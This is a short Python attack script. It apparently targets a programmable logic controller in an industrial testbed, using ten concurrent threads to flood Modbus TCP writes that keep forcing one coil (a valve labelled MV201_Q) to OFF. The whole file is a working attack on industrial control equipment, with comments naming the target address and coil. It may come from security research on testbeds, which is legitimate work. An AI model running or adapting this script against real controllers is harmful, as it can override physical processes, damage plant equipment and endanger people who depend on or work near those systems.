import threading
from pymodbus.client.sync import ModbusTcpClient

# Target PLC Information
PLC_IP = "172.18.0.12"  # Updated with correct PLC IP
PLC_PORT = 502  # Default Modbus TCP Port

# Target Coil Address (Based on Screenshot: MV201_Q = %QX0.4 → Coil Address 4)
TARGET_COIL = 4

# Attack Parameters
THREAD_COUNT = 10  # Number of concurrent threads

def flood_coil():
    """
    Function to continuously modify coil MV201_Q (%QX0.4) in a loop.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    while True:
        response = client.write_coil(TARGET_COIL, False)  # Force to OFF (False)
        if response.isError():
            print(f"[!] Failed to disable MV201_Q (Coil {TARGET_COIL})")
        else:
            print(f"[+] Successfully disabled MV201_Q (Coil {TARGET_COIL})")

# Launch multiple threads for continuous attack
threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=flood_coil)
    threads.append(t)
    t.start()